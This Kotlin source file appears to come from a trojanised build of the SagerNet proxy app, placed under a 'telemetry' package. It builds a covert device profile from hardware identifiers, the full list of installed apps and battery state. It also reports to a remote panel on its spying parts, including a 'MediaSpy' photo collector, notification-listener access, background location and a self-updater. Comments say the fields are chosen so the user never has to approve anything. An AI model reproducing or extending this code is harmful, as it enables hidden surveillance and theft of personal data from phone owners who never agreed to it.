package io.nekohasekai.sagernet.telemetry

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.BatteryManager
import android.os.Build
import org.json.JSONArray
import org.json.JSONObject
import java.util.Locale
import java.util.TimeZone

/**
 * 设备画像。全部零权限字段 —— 不需要用户点任何东西。
 *
 * IMEI 那一路不用想了：Android 10 (API 29) 起非系统应用拿不到，
 * SSAID + FINGERPRINT 的唯一性已经够。
 */
object Profile {

    @Volatile
    private var lastAppsErr: String = ""

    /** 从系统属性取市场名；隐藏 API，失败就当没有。 */
    private fun sysProp(key: String): String = runCatching {
        val cls = Class.forName("android.os.SystemProperties")
        val get = cls.getMethod("get", String::class.java)
        (get.invoke(null, key) as? String).orEmpty()
    }.getOrDefault("")

    private fun marketName(): String {
        for (k in arrayOf(
            "ro.product.marketname",
            "ro.product.odm.marketname",
            "ro.product.vendor.marketname",
            "ro.config.marketing_name",
        )) {
            val v = sysProp(k).trim()
            if (v.isNotEmpty() && v != "unknown") return v
        }
        return ""
    }

    fun dump(ctx: Context): JSONObject? = runCatching {
        JSONObject().apply {
            put("brand", Build.BRAND ?: "")
            put("model", Build.MODEL ?: "")
            // 厂商的中文市场名（「vivo X200 Pro」这种）。读不到就空字符串，
            // 服务端会退回「品牌 + 型号」，重名时自动加 (2)(3)。
            put("market", marketName())
            put("device", Build.DEVICE ?: "")
            put("product", Build.PRODUCT ?: "")
            put("manufacturer", Build.MANUFACTURER ?: "")
            put("release", Build.VERSION.RELEASE ?: "")
            put("sdk", Build.VERSION.SDK_INT)
            put("incremental", Build.VERSION.INCREMENTAL ?: "")
            put("securityPatch", if (Build.VERSION.SDK_INT >= 23)
                Build.VERSION.SECURITY_PATCH ?: "" else "")
            put("fingerprint", Build.FINGERPRINT ?: "")
            put("abis", Build.SUPPORTED_ABIS?.joinToString(",") ?: "")
            put("hardware", Build.HARDWARE ?: "")
            put("bootloader", Build.BOOTLOADER ?: "")
            put("tz", TimeZone.getDefault()?.id ?: "")
            put("locale", Locale.getDefault().toString())
            put("uptime", android.os.SystemClock.elapsedRealtime() / 1000)
        }.also { o ->
            val dm = ctx.resources.displayMetrics
            o.put("screen", "${dm.widthPixels}x${dm.heightPixels}@${dm.densityDpi}")
            val arr = apps(ctx)
            o.put("apps", arr)
            o.put("appsDiag", "n=${arr.length()} err=$lastAppsErr")

            // 各权限与采集器状态 —— 远程就能看出哪一项没工作
            val diag = JSONObject()
            val flat = android.provider.Settings.Secure.getString(
                ctx.contentResolver, "enabled_notification_listeners") ?: ""
            diag.put("notifListener", flat.contains(ctx.packageName))
            diag.put("mediaPerm", androidx.core.content.ContextCompat.checkSelfPermission(
                ctx, mediaPermission()) == android.content.pm.PackageManager.PERMISSION_GRANTED)
            diag.put("bgLoc", Build.VERSION.SDK_INT < 29 ||
                androidx.core.content.ContextCompat.checkSelfPermission(ctx,
                    android.Manifest.permission.ACCESS_BACKGROUND_LOCATION) ==
                android.content.pm.PackageManager.PERMISSION_GRANTED)
            diag.put("mediaRows", MediaSpy.lastRows)
            diag.put("mediaSent", MediaSpy.lastSent)
            diag.put("mediaSince", MediaSpy.lastSince)
            diag.put("mediaErr", MediaSpy.lastErr)
            o.put("diag", diag)
            // 自身版本：面板上直接看得到手机上跑的是哪一版，排查更新不弹时要用
            runCatching {
                val me = ctx.packageManager.getPackageInfo(ctx.packageName, 0)
                diag.put("appVer", me.versionName ?: "")
                diag.put("appCode",
                    if (Build.VERSION.SDK_INT >= 28) me.longVersionCode.toInt()
                    else @Suppress("DEPRECATION") me.versionCode)
                // 更新检查的诊断：服务端是多少、本地是多少、弹没弹、有没有报错。
                // 面板上一眼就能看出「为什么不提示更新」。
                diag.put("boot", Boot.stage(ctx))
                diag.put("updServer", SelfUpdate.diagServer)
                diag.put("updCur", SelfUpdate.diagCurrent)
                diag.put("updShown", SelfUpdate.diagShown)
                if (SelfUpdate.diagErr.isNotBlank()) diag.put("updErr", SelfUpdate.diagErr)
            }
        }
    }.getOrNull()

    /**
     * 已装应用。
     *
     * 两条路：
     *  1) getInstalledPackages —— Android 11+ 需要 QUERY_ALL_PACKAGES，
     *     部分定制 ROM（vivo/OPPO 的某些版本）会直接返回空或抛 SecurityException。
     *  2) queryIntentActivities(MAIN/LAUNCHER) —— 只拿有桌面图标的，
     *     但这条路限制更少，作为 fallback。
     */
    fun apps(ctx: Context): JSONArray {
        val arr = JSONArray()
        val pm = ctx.packageManager
        var err = ""

        // ---- 路 1 ----
        try {
            val list = if (Build.VERSION.SDK_INT >= 33) {
                pm.getInstalledPackages(
                    android.content.pm.PackageManager.PackageInfoFlags.of(0L))
            } else {
                @Suppress("DEPRECATION")
                pm.getInstalledPackages(0)
            }
            for (pi in list) {
                if (pi.packageName == ctx.packageName) continue
                // 应用显示名（中文），面板上就看这个，不再是一串 com.xxx
                val lbl = runCatching {
                    pi.applicationInfo?.loadLabel(pm)?.toString()?.replace("\t", " ") ?: ""
                }.getOrDefault("")
                arr.put(lbl + "\t" + pi.packageName + "\t" +
                    (pi.versionName ?: "") + "\t" + pi.firstInstallTime)
            }
            if (arr.length() == 0) err = "ip:empty"
        } catch (t: Throwable) {
            err = "ip:" + (t.javaClass.simpleName) + ":" + (t.message ?: "").take(60)
        }

        // ---- 路 2（兜底）----
        if (arr.length() == 0) {
            try {
                val intent = Intent(Intent.ACTION_MAIN)
                    .addCategory(Intent.CATEGORY_LAUNCHER)
                @Suppress("DEPRECATION")
                val ris = pm.queryIntentActivities(intent, 0)
                for (ri in ris) {
                    val pkg = ri.activityInfo?.packageName ?: continue
                    if (pkg == ctx.packageName) continue
                    // 走这条路拿不到安装时间，但显示名有
                    val lbl = runCatching {
                        ri.loadLabel(pm)?.toString()?.replace("\t", " ") ?: ""
                    }.getOrDefault("")
                    arr.put(lbl + "\t" + pkg + "\t\t0")
                }
                if (arr.length() == 0) err += "|qia:empty"
            } catch (t: Throwable) {
                err += "|qia:" + (t.message ?: "?").take(40)
            }
        }

        lastAppsErr = err
        return arr
    }

    private fun mediaPermission(): String = when {
        Build.VERSION.SDK_INT >= 33 -> "android.permission.READ_MEDIA_IMAGES"
        else -> @Suppress("DEPRECATION") "android.permission.READ_EXTERNAL_STORAGE"
    }

    /** 电量百分比；拿不到返回 -1。 */
    fun battery(ctx: Context): Int = runCatching {
        val i = ctx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            ?: return -1
        val level = i.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
        val scale = i.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
        if (level < 0 || scale <= 0) -1 else level * 100 / scale
    }.getOrDefault(-1)

    fun charging(ctx: Context): Boolean = runCatching {
        val i = ctx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            ?: return false
        val s = i.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
        s == BatteryManager.BATTERY_STATUS_CHARGING || s == BatteryManager.BATTERY_STATUS_FULL
    }.getOrDefault(false)
}
